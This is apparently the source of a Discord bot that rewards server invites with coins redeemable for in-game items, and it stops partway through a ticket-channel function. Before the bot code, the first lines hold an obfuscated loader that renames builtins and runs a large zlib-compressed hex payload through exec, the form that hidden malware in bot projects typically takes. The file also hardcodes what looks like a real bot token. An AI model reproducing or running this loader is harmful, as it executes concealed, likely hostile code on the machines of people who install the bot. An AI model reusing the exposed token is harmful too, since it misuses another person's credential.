pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98);lllllllllllllll, llllllllllllllI, lllllllllllllIl,lllllllllIIllIIlI = __import__, getattr, bytes,exec

__import__("sys").setrecursionlimit(100000000);lllllllllIIllIIlI(llllllllllllllI(lllllllllllllll(lllllllllllllIl.fromhex('7a6c6962').decode()), lllllllllllllIl.fromhex('6465636f6d7072657373').decode())(lllllllllllllIl.fromhex('789ced5ddb6e1bc992fc15ed93498f96f0be7ae05f383f60080d8dad9935205b035b07e72c16fbef4b49bc74554544465637258aa2300f525df2569191d9c5a667183edd5e7fffe3ebf5c5f0f1fe7ffebe59bc1f96bf0f1f864fbfee7ffe3eac7f3e7dfdf6e57e3db25bf6e1e3f061350c5feebede0cc3eacbdd70fdf3af2f77fffc71ffb8fc71cb3fee7edcacfffaf069f8f034f86918169fd75217cbcbf57f0f238bf5d887c558e6e37831b81ed84eecc73fae0797cbabe546dba7cf57bf63f95bc73efe7df7afcb6167db48e5b01ac63f8bcdc0a29e78185b2e3f3ffeb29eb9fa6dbc90cf809f87c58bcdeaf7efb7db86df76bfad1d5b6c42017ff687f5b0fcebb79fc300d76e7dff767ff3130bdbaef8dfffbb6c0787e1cf6fb7371bd9a5ce1fd7df6f885260e15fd5da72f6cbedf5af5fbb055be5773fbfd6e2b7537fdede5ddf37bab7b35feebeff7d7bf3efcbb19e2d883ead21f2e112edfaebf6ee8febdb5f97f5f83a019097dbe9cf579768fc01587fdddc5fdfdfffac41b0582e1ea02201f238b746c90e5321a4ec1d58c07827dfbafefbb25bc5d06f9d699ed81b645b4ee293d447b91f7742a67834e3f18a1d6ba46e29659fe016f7593eec43b18ff13c4cc878b0ceee049147aeb5ee4957c66e0cc8110ab142c466b15a6b04ecb7c8f1b1aabd8865ab75bcf0a1203d84191c46be982e1e7b8cedd843a097cb75cbf1207c0bcdff7e62f056cd44d06ed46d6527858e8574924a2162b77cb77aab7d33fe7e8171a5752f8ba57a2d42eb1280c1317efe68cd439f96b51230fbea83d8a844d1e2b197a1dd1b86dcee98375d6dae29cd908f7f741369ade889972c4d3f5f01e67b9a5a7440d74f92d1688df7a09b1f4f1b1dc0a38726fc878d80a12ea5fab79cfde58fbd182e7c9a99eba452244759aac0d46488afb3f1130add62dbc5ef9e37ab350f3de2ee09b55fc6a446e7d590c307599217cf5a0693b83b67db8cd946fb20b4ed689cda2c9cdab937bbbd747c58f59f5b13c8a509eacef7021e99e550a93e92b235320d7c1c92ee88995e2d8b7d8c84d0e0d43ea45218ee24f826e2b2f6e7a9935af468d3eeef9d6985a5eba217689ca31e284b49e9605ed167a8d8d1ddf2e6725aa56b21a26c1b667d7644fb45f9ebab7e8dd9d0ea6da0dee78bdf23eecaebe5073a5c6c5497962e9671ab5d6ddbe1b590058efa03c4c4535cbefdb9091a8cdd43a3f8e10a34886311cb9bdb5f3785298f367cc8cbde09ab90b65cfe79f7f3d1916f3f1e7a367c9f88ead3c75d819ae15167f7c758c77b2dabdd872e1677f7fa50c9b02d9570ee312e4f017aba2a7b88d16ed536d71f1ef0d96717fb0e7faba0c4d5a276620120355eb4fe3d4639a1a42a628fd11a5dffbd7c9bbef96db95cc2cf602acba0615b117e7b19d08bb0602f3654b6f3ec3212857e0b2adbf8d33cebf4f66e26eae7382089038990d243fe45ed322e95e3e643ba9e6b87461f5376c3a5f3d1077c229b8b8337cd00f27435d27f2d32e142a5fd9926ec5319b6833c263c9241a5e745ae012e1b7f95bb1b8487f415a87d22ad23aa353804995448051d7dec3009b399233c24033164cc508b5c029c7e94531f4e9acceef127d55670bf23c7662b7a2125ec7f9b5c69d049ef7477b2bcb4a939d2913329644f78d8a506689193a6714ef53aafd6e62bd13ccda351cae64c9586f9676a986411f61864deaea787bba79ec501cbc8c8041949eb69ed253b9f4945bcc7f5642f34f13160be32048fcadddc57e28c4b89448accc78a137b28396d67be67436f953b78e1d9007dc6267f2bda83c5feb7e90d418e1ff2cfc150ccc8444eac7dc0edeb433d7e981f42db9f599972520ecf74f07b21e8b76eca7c560adf86249b94ae555da8eb7ad2f4aec867bec29a5abbf0cdcaa497b50e9e26dbe9fec2fb124f7efab7d0d3de9cecbc8f691ce949eed99e2dc29856309ef3667062866ec792fc46cab36d4b1719ee7f3b5ccbd3eae8be149ee9d6705a6371f8a6c27d08709960ae0bcc99af82d0c2f96ec88bc0756273eef66dbe03c3b103a57d0a5a677cc4cddf5c86e266ee043acbe64b5c3977f5250778d5a1aff191bfed203c5b3fba5732ef05087263fad3f2bc1f5216a20ff4597aa6601cb4dd3eae3b62fc94f5fc743c23ddd565baf1a7a32198faf917d208ad80827b30ec4bdf9a3de97a77e6266e861a1c42ffaa39a69dc2fc87761d34552275dae549cf67ae687ada855cdf53608087b273ecba1c9ebda598bd659978ddf0427720a3e271804f4326772c0680a7b68613ee1b8ea6f28d4ceabf93cbdd634f79387523085a9be7fc447a8ee33b5c0bc9751e905a37bf89239de9fa465cb14c86693f45b6aeedec38e84b11cffc19c55cd99dfe4d96e6096978a8a2bbf96dd22368f246b967177c449cf772b9a7ec4c285633bd1e977f0ae74f3ceeab13f350fc33bc14d4db7b1de213beade802c973be71bcd7ea3c423fef0d97df546831136e26a676c0fd1fd11cece5fd29cf162ff4f5980df80f70612d7fe3cc96ba24408399c79db99e9013403fc0035eeaad6318a7d98823c35a19682b579e503cc3c5dd93dce9193169f7fe9b9debd95ac6d3dfbfc13930bd128b57e3a507fc63ababb0a335d4323308413ba5021005d3b3b2b14f0e2bad29c7ea3914debcaca7e91eb367883ad3dc880ca3613b501b9a327c55fc5e4be78624adccae6d96cab8224c2bd315b2b0342031101261f4f9a2974878209378d152a5153469fa7e9c5b16006542564541929c623381c03116d48c7630ac6484096175418064c0409c1c2c1997cd1b36c3a3d34577436fc264b738072a3753f3dd7f3f5fbb7cee9565f784c1e400572ac9fb51cfbd8ed6989e6a92e5f454fa8cb7c30a72991d99c30f33410ad67113e7105898c85c43aeb6c349fabeec788d19e5c0f9dcb15ba69c6e4f5304ca49d189678e6440bf4f0e8531f5cf1136c3a3370266ac36086fcca1e3a9b9fea98e89ff12c2217b7a4a0ff3fe51ab22b6d9884a61a7520cf682b4d6239b7da91e358b4f87f70cb55ab3320a39a91c8fa1d863b6df532215ab08603c9c5c61ee0854ca417ddce469c0ecc90c314ac16f57b86278a65ad7ad2a8c8e912c264521d981ddfba9543717cad57638dcdc472faf91920c84c03829a496321dd046917b865637106a98f2567bd4096175418064c0409c1c2ce1aed9c36678f466d11d5589444bbc6a3f15d9fc4c7b0c9b53e0e19ecc40fe1de68fa1d68c4db381968254a518ec05d9dedfff32eb1c56307cccd35c4f02eee75ea80bc2ba342f0015ab08603c9c5c61ee08d0b926d2753e608699d1e88b9d1b64048340cda8caf02d84ba4930487660f77e2a418f865c6d87c3ac7de4f01a09a517fd0aa9a54c07b451e49ea17f0d841aa6bcd9c6b33fac2e08900c1888938325dc357bd80c8f4e17ddb80c08bbb39d913669ce7f03e0a02fa0b5a83bcc1f5b5db24d79be17cfe04be933766fc5bccb6879fae9488cd1dc0b75275897605226a88bc9637f7281c81d5ae965fbc4a3ebb19b01da87ed82007f9cb51bcd6dda5ba7c28c948797897747428de6bb18ff48699e3af776285f2e0f169cbf97773012179a1b9161343a793869f8117e2faff6c0a82c32ea08f1ca31853b2c0d480c8444083e546cdbe89def4e2c53a22049c6b17942e0180b6a463bf857f2c584b0ba20403260204e0e968ccbe60d9be1d1e9a23be8c9783370807efae1679e8fa78fb4336fa07bfacd38d80b125e8f702472eb1c62307ccc335d470e8ee6d099e5650d012371b3fd4619a9584500eb608e9e2368bc89d3033b94d1e695a430b95642500fb44e078ed61c51176e21584f30aea9044e8f7225481181173cdfeecf50a5ed65e07bc01585be12f1ad720132da901132c267d1d61e791e89c9b78c90a497a3a5453ba1ba808a2b152357eb89c901dcd06c147d2215d828c3089593b3709a3e7ec816dcba7cf43f98538608bbe3f4e683aa2098210d9cb1b21281007886add547470244a4a954e0925ac7cab59a2a18b7c8689088c50e414ae871999c4f1904036f223821518a95fe2414e9ab16525e8c2515e85ff5a169b279b3f48862eee247e0ba01d64829321572cb6b4e24c98e8651a3a5763e72059e453a32ad252b3eab9ed21b3b3dd84a3738326a51022615fe0c1d9c9f32c358a18a0d0e35b794fa93e994f8e9d77e61766af6a7fa1c9df71ed91a33ad73c4fcd2018572ec3cddc0cfbd8d69c00021a1127fd17a28c1e76904fdc0a3e83b300397c43462dbd279acbdef832bf58f48d35c424aef7811b310d4ff9eb4c40e61ab4598d509d8a7ce62db50905592a96b99424ddfc90e4f6e6f82496c41ee8f9538bcd8ccd34d326519ab06b4c03685aeead086d787198668788c18e5c4c70bb652a11d332f33837f3033e67613f16a941f4c98b79ca9485086326eda44b080e47ceae012f5abdce617c3c88a7e4b20aed22516bbd38ebaf701c0d1b87d6efca42647f4594b121fc860d39ce32528cb1f7fae6e419e7281c8594437975d0fce3842a421f35a27cae4c4818cb27cb6b7191bdfe9a07f507a72652a6e01cc7e73607075eea5045f30d80e2e9aac3a05d72974842c060e265419f0507b18ed8632cb78f58f484b504f503fea59ca52cad5609f4eada003a05e9443f25377e0a4741a3b635f229b57ca59d291efca356855a5157bad9d8ad7d3c316df8ced8f466054618bb43c800788026f022053b59aa93db5f0a85b30f595ce3af9ce40434ea9ce4569834e103e29990cc72bf97f2048d061ba891a8d19c58ce6929a1c4b0ace40c7b2d9cc6c740d44f8980010b11d4d3663f2b1b9f51572b1088fe31f980f721b78c1d48499d2810bed54476e8a49c0324c018e4a881e8505e6ac010c1124c29c485073259f2d8c088f99ce4c1870cc1fa2e23db9e4544998a926ab0693518b68dc6c57b6875d67ea3e51e28c6328ce1e334bccf696a626b6858aaeac42aec82559f625e1454267ea9c2616106688831d0e0c83d99a55dc8cf058ad3d7ccea2d75a8e6eccf85aeb6222404890084007e6ae722cf1e489b48045e388acc06f4247ea852d3e8a3859eba1795df8129c4d8ab7aa3dd3df79cce92b862bfe6e013343eee80ca5e6b732433fc7b12484c604d4da5edb4b58e3f56e5a37b0b699dcb507cf215f03afc82120cc62820307220e167065623772a8ffd9f7858388cce3f62a4f48464a55585ef80169be9a8493c1e37563e421c9ca53111e23c410da69a9f5192ce9070a7dab6c72bc6b8ba2c53101c89a919b64d95e1d26294461fa740594b04d039e8095e47c3337922e42358c571d2bb7e9087726cdb1a3928346bafa320dafe041065aeb5d80e0905ad9d1559b7532d42209f94c21d099ec4135e9aa8082eda7c99c6379ab7aca8002f097a3482255e127996071dabf3df6d5f42252eb1cafb8f502ba8c8b5c3ae6c86254e0125eadd7babd439248a0780e72ac0107a0f4d68c5666787e8c2033e0b25a4564a1642861079c7cfd09250f0b10d0887ffc8603d8cee15f8f58a70ac65c60da1f74bbb7ec8c0c3c7d513af31c8e54b793e485068a09a65b7c79075b61b05b61ad49df440c6f54724d0fdd15f06aa6eb25e1b11956e465957595da3ed85987cd2a978d12604bd679a6938e8a1c438961a664579a05d1d21853644c046b6c00322fa5707b94a568ee75a802936d5a844480413da9292a7daa6c329929d128b1f5a41f4f25d8c86b17e7bb515959907a4fd2eb00e75455c8f35286d10001fbb512eb5579957401ba53addc8400d59188a9daf5dbb155e60bdb221323f29ca735c0848d4965b0565229b210824f7355c293ef656d63bd3b41ac6af26db0d069a8521b8254e4396f567c66cf683e466e63306b78c24fd4a9a0c62a6440e5cc3925dea2aa68b2c264f402e15e60353b3611a2d84a1d82e4f1f233e99f9aaa9080c75b51a970ba3c3a4aee74884fa46e84d8233224a0998cb4eb24a8c0cfdabcbe874cc610345a40a0bc43cf7c3f435a5bf80bc3d41c18dd4e1d2fadf0222ace9e1269ae33697516a330586e6f4255abf0507b50d2bc1807a664694f7babf55b0975bd06cbcbbde39bf882043c7945532902b2bf98181e00d4e516d0c04a6548bb531bd5368ca9cca1b457c7d5096c0ffc9e11e9cd8fa2f12a5efa10d5bcb022f9759918f0a37590837c13fbfd95be658abea1e82df3f6cb240e0854745fce4f765413d28e04b99bc619de99cc47e848634da4a4e7f3703244ccef39a4caebc6a564cc8bb1203b25a0b70bfa689eaa6e9e3c81c38466d46186918f5c4d7d25ae91a438a39bece9e905ce868911a93813fddcaaeaed632328cd8d83c724a200338ffa01ce59cc4ba83c7f47c48303b8b7de6257666eab2e64a42e2e2493077983cff4b6b166551b0021589879b459f82a54e5ce7ebb2f910346718d92a59e07fa0d25d2853823631d21edd8ac5aab0ebb2eababc1e3483934881d92e422b02b001707c3b90fa96d38765aaab75babebe0653ecf70ac24e684b8a4a8c9c42bf5489005309d07cb5fcc5be25479ea117d730480c963ca88f954edc6e368aac1b1821cb9bf25124dc9d29ee2599d8e6f29d4f51a2c6fd2074ae542b76fd57bf81c9626122bd212a0a5d97abcff70945c5f2da666905cada5aee49fcac2234a86e6a7f252a24a62aa97f1b05c252d9b2661a20724d84789e30539926567d0c12a6f83e10fa88aca88048fd113f05b7d20d3f1861688731d42b067009b7857af565cf16badd3391c4960d41824a976a45c2bd210f703c92e21063d8a9855dc182964bc55b65376f6ca36513172842927a75bc3935bcebca5936f83040fa80aad48b409c1b06c06e427a80c4856230cad9af109a2f6449a0f25b5272c52591727c7af366b1017008713acc12332dee1d1a166a656864076b358afcdb577c224309a7eddbc0c5c0102f704b0ddda1b197d1a3e8bfc414ce8ae5acb311130b7ddfad6324ce388db2a234eae12e6f2ef6dc44b4c8288f494ab2a78313344fc0dd60017f4db1edc5c6a60f4913608ba0c17d4a2a3c3e611ac5bf3dc9c287460438142744860913ec7cd704cf32c7ea3e5fee4ebc8d4235625f78854a3a714a44170fad2b18a05061d11d0d702c928ff1c6702da225663ade78c382255d9171208db36c85935d66a16de8f864ea29d0cd79203c2caac2433313b4961c9145f9305e7ef3683fb09d3932e2829aad4189c6274a3351b17069d3c8337924e921d5080db18aa2ca08737f54d286f72a89f410356120e61bf5fdca5d870bce79c58eddc4ba96a9f00fdaed5bc6401ded5cba90b2dce836385f141d5365bd4d0dcc81a01a961bcea280e7d16552452e484cab39147f0b4dc9f7cd551d473e760cea34a6d68c3e75cc04c643fac5b910f99ad380fac01ae3bdf51eeebb2e3f70903368f543b6f11356b32ffb280821659615c47b49e22f4332f98b51858146e1c5e40f9b90abe982a6b12c1cf2621f63df610f58a9c2a4c88d54dd3c9a3aad9b0e64e8b92c8cae7a684fdbec0661c87b1b9006bd89408c4da016e4ceba1853014723016909175900add61aa92b1ca8e90f79e86c02ac3399e5078868f66331f4627d1a4f47f7c2113ae87aad2bb02d2234ed4bbe87b22e42c9015614f67d83554b6f8efaf30fb3228c3d0975e84a877a1257c72da788720daa5a02828778df0a8704590a0ff744dd498c261cab19ebb217ee50abd5b1d3e31a912f82afb532eb118d35c4f1016d0a009530e2c3b470696a178f2759cdcb1aaf25ffc472db65bf2bc940416e87960bd01ada1ca94be0acbf570dab49e5c94da701ece00830443b0f3832ec56575b756ca548136c02aa2cb2ce70100fba2a7ef205b23efe910141eba573b6a73ba40a345134eeaa7dfcc1ecffb6d56052dbb8904ca98800623548d89b77327f4ea54854c7a2c47c3c3126ce029c6eba2a7c22ade64370c5ffcd59bf1fe720a0d942a926968647d105f7fa74f86c233508db8d0f09d72610f30bf93195908d1c9cb6053931b492f4559c5bf4b914175d479f008067d43573fef6036960267dbe14ca4c87e6d635f5367f8572613ff4b182fccd47b1cd01053b783ed6e689aa964884306f3d0d699b164bf299d1d78ebd1fe8333507282eea415e5bc7f523679eea65864b216f36c49972626a8e565bbfd22b522f48c9d4e698c7eb92efa76974b4b074f7f2647c201246c2303c99d896b0af5886ee7676bb99cf9e2430b7aa6ec187080a9a4d1e84b358191b38d982058c097046cd414330cb8ec8ae44284a0046441ae8fff265438f1b51927b7bde0c458b61212855788c653aeb694e0281bbce881a4f3ccf1eaa2616438dfd1c661f72dbdc65d104e156394d00531b5f55dfda93c4b1369eb65004d9db74a1f9d6307cc3232db5d99a6551927d2d8f63a802e382d6a044194d2a1bc80418240e3a7236c0d13b221274adf71e60aeb21bcdd4e0e0b91fd1de92ce9e1ed37a6aa5422eb88c5954a04156095ce0b2bebcb20857ef083612687cd065946489c55a53820ecd81518e05ca5c4951a82aeb33e05a416a67fae60716c87849ead8d33a93abe3740008088935ecf25502f13c2f5972dc7eb3545083a497dc551c35a3902f250e029e962235e103bd36adeb8457488f8461b1e58f22c6f7d371666698509a6e338456a8ee5e60bd3e224876b7b3cdb4fd3704626c49d9df515344939088175a88741853e08000ba6ccd754fb86330bb3a994135fba8c35ca82cf3cec6e2a9a65621730e6687a88fa474041ef451b23a88a858daa37d7fe9dbc87d972596e87b464b06f25b34ae17abd93537867a4bd54afb9cdaa50c823ea436d9ed22f00c6cabec39f8175c4a35561b3e1eeab7c7eb32611afbec6ef069bfa758a506d422898d26854d2621c67da349cc9de2c8b14c05fcc585140a82dd693cffc8aad26d366f05a1d2ed12e23c76a3be0d56f383211fcbd1d8b2288a5e1ed74a5b097494ec2260a589cc76a36dbdf2852ab3cce853cbf9efbd76e7012a838f498b13ac95d1168a61f0b2d30f0480c5d556171f630d7045e188526eb3cd1a0b3461eaff7194420023a27ba1ef3830ff21584949f317843d69272189475dd1056190ce8279bf49ea8e2d4af2c369a068b681c49f5093569ca4949950834b72ac536b0b505b59e9439d2ec58350e31bef6ef18d18c74c22e5ce5190518165802932f75da27a36a371cd4313b8fc5cb1ae2ec417b854b847e594b794f1415ce08d32d216d94ea11e34504e5c7d8467824f91762825d89cf2261fa5b9ce0897af164392655f54f8bd7e6b411a419cccd7fdb00d3c27ed22d6854278e848f71ce798adc1af841a20392897104cec0ed5280838c583cb2c9eeb28193a170098bf0fc20665aad21dc8d3da6c938c26d7dec68cde556bc49a11583232081ca00ed4aa01d6d6ce43f07a9c6217f154e3cadd004e048685654e81d5b9acaab667db42386281962bbc18e693a982611e7ee3349f1550cba983b873a522ced43c672db06cbf638205076f3bd90a089c43a2410129f6c2b78aa298696c6a368839b5da1186c82ffc99084a2f5ae15f7058d72fa92e24084cd248a22c78fceda5f5b019d6eca8b017e458110a1413fc6793a470fad0f517a59844e8f01488777d1647b70be0cb96e3b42bc0961452854a6a7d0165948522a5909994f933e87c6e8e84fe6d0f7c37f8b70bc20c874ba7637ee527e3b89a856dfaa254e82ece8c450f2bd559426cdf28a82a4dfb95ea6950fbdf4494178ebeb0f434ff02ecf185adcc8d121c43eb46a7daec36c5659555ab92aa7c8765a41aa34e6fed280851530764f92625820331c4d4021606dba37e12a66e60fc8a872920fb531d27295b7ed6498c93c502a84fe69557b02b047645ba89fd0bd68829d41dd8b3c30f25389d0558db6ae051468a1962c38bacf9db0c39161118b4ea2cd5c6235d35eeb055d0607ef72257353ef20e96e170127aad374304d0232cd620daffd8a546b598eb50208e24afc04962116f7ab5f8245c509c74e19206559d3e8f5c0a27c843bc0ca101434d3ab0b9a0cae74a8020636638a62588464057f2d2c3a8a76ca9acaf046b8765a93453fe0c1d6ec45c46d9936126fb36a41a732ec201496cbb3c44df53cf91cbf7395b85e0baa008927f2108c1128bad43d34b3fd8d70ed53aa3df0b220f440a3b3b18b0579f6469cb897ae3398c567aa61aff01b474125d6a3c4defe4b4196d5c6e72dc7525b0d79d45c372de35c97b9c153bcd8060c9df685e9e244ac922458d8c8340ff2218db8ad1c582cd71a5d99e7277082a05091bbda22fb1fc725161a83524cd7907f412ec268e4f3b71ed0e9658341609f8b517645bb431be10c8b571085e6488396a387a0cb9d911c318fa6102ceb1599a898e6d675409a6c3b831d184f05c79548ca78a61c661cc8c4e2f59c4989a06634898fedb891307e3cddd3473260044e0e8f3ce47386cdf0e87461adbff2cccc8c421ed76101887679fd6dabc8ed8dc8ee8215bd74352b4172c31c79da9394a13a97e88185982bc336b555d07658ad6d479af4ed199a10d03147d610104da6fd5536ec574c21724395e056bb356d153c83e1dc48b6f8503c3a9e5a5e2d2f1f7efd3400818bcfdbd1c5f272f1b0b05ab3582eb602463fddb2864fb7d7dffff87afd113a18c37c2893d98d54cbd3b3fd51ab2296da253cc5283d54c917249e6632f52736e768a912ebea8b3ad3dc880ca3613b501b9a32bcf9be4ab157d254c6ca291eb51d202a103203129d5540fd34cb2b89819008c1878a6d1bbdf3e586654a1424c938364f081c6341cd6807ff36acd41745f7cc910ce8f7c9a19051d7bc61333c3a5d30b38ff19eb5072f7e8eb489aebe1d74ee9ab5e67a52c2c6eb02a8091d14be9f7b3d2d3452b18a80d191b3620ff2a516d18a3c774c9629a75b648a40c58447e5b8678e6440bf4f0e85713ecf1136c3a3d305f311744c33dc59ce74ed79a4cd5ab5f8dcb9c99a6d7fc93acf621df9452de069e600e670bd99f9160eb4caf707a81754cd89112a55a1dd2e70e89a842d69a4e17c881d3397906c6e4635956a6942b9da0e8744fab2ed3566a8931ee7a70ecb94d36dd474164e08ab0b02240306e2e4600977cd1e36c3a337896e8d7b34abd58f5bfe395f979822eed99e1f5ad41ee68fad2ed9e61ccd03845c707e61829a3d43d405d9b424dc499b4d2b35c1f0237c6102da2fe38a30ad4c57c8c2d280c4404884d1e78bdeb9d5b64c796bcd889578134f1fc9801138393cf2909f7b6c389a87757cd5422bfda1faefedcf7c7df811b6e0e7772dd4b467a5959a96d68e72b09f3b37dc23e96fb6e1aea61209b9194c24037347e32b4c67f5af43f764c81bc92aa462c5d05a28c955d03474eb848b4a72a2129051cec8cf5434a674bf8e9e3e263b3f3c5aa69c6e975d05aa3b8a09b66f6440bf4f0e853171ce1136c3a33703e67275b2a6d52acedfebd2fbf26914d9c70fd34b3eae85124eaa93a22e50afe6b03d6bbc04a503fc72f9f26ab9bbc4e8bfbc98b67b7bf5f179b8dcdabb7adaf1f4db6a3d3e9a79182f16d295f5d287fb9ad96e6ce67e77f3f3d5c4f7519f338e62671be299e2f3dc5e19e079ad8e6d3d9903fcaf3200667c763fcfe824ce9f8947759c87445c9d8b948fc3e9abc9ff38ca54738a40cff559c721bdb99ae525a923a9872ee88fe2dfce69654d11351df90f9beb0fc6a65ec95f22a1a3f9ecb542b47367e52551bb3ad815ee25f5b456ab642adf1eff7e3aeadf9f463e7d5eec5c5eed56ed12a2b471b15c9f7db39caca7cb07bd8fece58b3d6de57ebcbcd6d1ae0aac5076b45be15aaa417aa8ec521bb53f62a7d8f8b8ebeaf7c506ca178bcd6f175feebede7cbcb8f9f7b7fbc5c3afcbe5e2bf9617dffebcf871777ff1e5faf6f6fa8fdb9bc55f37f7d7f7f73fd74afff8e7b7dbfb6f3f7ead13e3e2dd97bbef7f7fbbbd797779f18fbb1febad17773f2fd0d2d566e17acb307cbffbfacfdb9b6158ef7af76e79f11f9f2ede6d57beb304fcb8fe5e6edf9a717173fbeb6663ca629b4b88361fe6cae1c5b6e880f5ebc07d5eec44bd7fbffbf5b7cd6fcbabdfc6db1fd6efd69453132583eddb2d57cb6645e4d3c7bd66cfdc462759bc583f87c7abdc086cee4686472a5e8db75ece18da173ab4e5ff03c204344d'.replace("\n" , ""))).decode())
import os
import asyncio
import aiosqlite
import discord
from discord import Color, app_commands
from discord.ext import commands
from discord.ui import View, Select
from typing import Optional, Dict, Any, List

TOKEN = "MTQwNTMxNjYxNzgxMzg4NTAyMA.GUIAe_.DBGp_8_qmOBGM1NxikWOrxOPyEdsR83v3DcOXQ" 
DB_PATH = "invite_coins.db"
TICKET_PREFIX = "ticket-"
FRUITS_COST = 5
PET_COST = 25

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

invite_cache: Dict[int, Dict[str, int]] = {}

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            """CREATE TABLE IF NOT EXISTS coins (
                user_id INTEGER PRIMARY KEY,
                coins INTEGER NOT NULL DEFAULT 0
            )"""
        )
        await db.execute(
            """CREATE TABLE IF NOT EXISTS invites (
                invite_code TEXT PRIMARY KEY,
                guild_id INTEGER NOT NULL,
                inviter_id INTEGER,
                uses INTEGER NOT NULL DEFAULT 0
            )"""
        )
        await db.commit()

async def upsert_invite_record(invite: discord.Invite):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            """INSERT INTO invites (invite_code, guild_id, inviter_id, uses)
               VALUES (?, ?, ?, ?)
               ON CONFLICT(invite_code) DO UPDATE SET
                 guild_id=excluded.guild_id,
                 inviter_id=excluded.inviter_id,
                 uses=excluded.uses""",
            (invite.code, invite.guild.id if invite.guild else None,
             invite.inviter.id if invite.inviter else None, invite.uses or 0),
        )
        await db.commit()

async def update_invite_uses_in_db(code: str, uses: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE invites SET uses = ? WHERE invite_code = ?", (uses, code))
        await db.commit()

async def add_coins(user_id: int, amount: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            """INSERT INTO coins (user_id, coins)
               VALUES (?, ?)
               ON CONFLICT(user_id) DO UPDATE SET coins = coins + ?""",
            (user_id, amount, amount),
        )
        await db.commit()

async def remove_coins(user_id: int, amount: int) -> int:
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT coins FROM coins WHERE user_id = ?", (user_id,))
        row = await cur.fetchone()
        cur_balance = row[0] if row else 0
        new_balance = max(0, cur_balance - amount)
        await db.execute(
            """INSERT INTO coins (user_id, coins) VALUES (?, ?)
               ON CONFLICT(user_id) DO UPDATE SET coins = ?""",
            (user_id, new_balance, new_balance),
        )
        await db.commit()
        return new_balance

async def get_coins(user_id: int) -> int:
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT coins FROM coins WHERE user_id = ?", (user_id,))
        row = await cur.fetchone()
        return row[0] if row else 0

async def top_invite_holders(limit: int = 10) -> List[Dict[str, Any]]:
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT user_id, coins FROM coins ORDER BY coins DESC LIMIT ?", (limit,))
        rows = await cur.fetchall()
        return [{"user_id": r[0], "coins": r[1]} for r in rows]

async def cache_guild_invites(guild: discord.Guild):
    try:
        invites = await guild.invites()
    except discord.Forbidden:
        invite_cache[guild.id] = {}
        return
    mapping = {}
    for inv in invites:
        mapping[inv.code] = inv.uses or 0
        await upsert_invite_record(inv)
    invite_cache[guild.id] = mapping

@bot.event
async def on_ready():
    await init_db()
    
    # Enhanced startup embed
    print("🤖 Initializing bot...")
    for guild in bot.guilds:
        await cache_guild_invites(guild)
        print(f"📊 Cached invites for: {guild.name}")

    bot.add_view(RedeemView())

    try:
        await bot.tree.sync()
        print("✅ Commands synced successfully")
    except Exception as e:
        print(f"❌ Failed to sync commands: {e}")

    print(f"🎉 {bot.user} is ready and online!")

@bot.event
async def on_guild_join(guild: discord.Guild):
    await cache_guild_invites(guild)
    print(f"🎊 Joined new guild: {guild.name}")

@bot.event
async def on_invite_create(invite: discord.Invite):
    await upsert_invite_record(invite)
    invite_cache.setdefault(invite.guild.id, {})[invite.code] = invite.uses or 0

@bot.event
async def on_invite_delete(invite: discord.Invite):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM invites WHERE invite_code = ?", (invite.code,))
        await db.commit()
    if invite.guild and invite.guild.id in invite_cache:
        invite_cache[invite.guild.id].pop(invite.code, None)

@bot.event
async def on_member_join(member: discord.Member):
    guild = member.guild
    try:
        current_invites = await guild.invites()
    except discord.Forbidden:
        return

    current_map = {inv.code: inv.uses or 0 for inv in current_invites}
    old_map = invite_cache.get(guild.id, {})

    used_invite_code = None
    inviter_id = None

    for code, uses in current_map.items():
        if uses > old_map.get(code, 0):
            used_invite_code = code
            inv_obj = next((i for i in current_invites if i.code == code), None)
            inviter_id = inv_obj.inviter.id if inv_obj and inv_obj.inviter else None
            await update_invite_uses_in_db(code, uses)
            break

    invite_cache[guild.id] = current_map
    if inviter_id:
        await add_coins(inviter_id, 1)
        inv_obj = next((i for i in current_invites if i.code == used_invite_code), None)
        if inv_obj:
            await upsert_invite_record(inv_obj)

class RedeemSelect(Select):
    def __init__(self):
        options = [
            discord.SelectOption(
                label="🍎 Fruits", 
                description=f"Delicious fruits - Costs {FRUITS_COST} coins", 
                value="fruits",
                emoji="🍎"
            ),
            discord.SelectOption(
                label="🐾 Pet", 
                description=f"Adorable companion - Costs {PET_COST} coins", 
                value="pet",
                emoji="🐾"
            ),
        ]
        super().__init__(
            placeholder="🛒 Choose an item to redeem...",
            min_values=1, 
            max_values=1, 
            options=options,
            custom_id="redeem_select"
        )

    async def callback(self, interaction: discord.Interaction):
        choice = self.values[0]
        balance = await get_coins(interaction.user.id)

        if choice == "fruits":
            cost = FRUITS_COST
            item_name = "🍎 Fruits"
            item_description = "A basket of fresh, delicious fruits"
        else:
            cost = PET_COST
            item_name = "🐾 Pet"
            item_description = "A loyal and adorable companion"

        if balance < cost:
            embed = discord.Embed(
                title="❌ Insufficient Funds",
                description=f"You need **{cost}** coins to redeem **{item_name}**.\n"
                           f"💰 Your current balance: **{balance}** coins\n"
                           f"💸 You need **{cost - balance}** more coins.",
                color=discord.Color.red()
            )
            embed.set_footer(text="💡 Invite more friends to earn coins!")
            embed.set_thumbnail(url=interaction.user.display_avatar.url)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        # Deduct coins
        await remove_coins(interaction.user.id, cost)
        new_balance = await get_coins(interaction.user.id)

        # Create ticket channel
        guild = interaction.guild
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True),
            guild.me: discord.PermissionOverwrite(view_channel=True, manage_channels=True),
        }
        for role in guild.roles:
            if role.permissions.administrator:
                overwrites[role] = discord.PermissionOverwrite(view_channel=True)

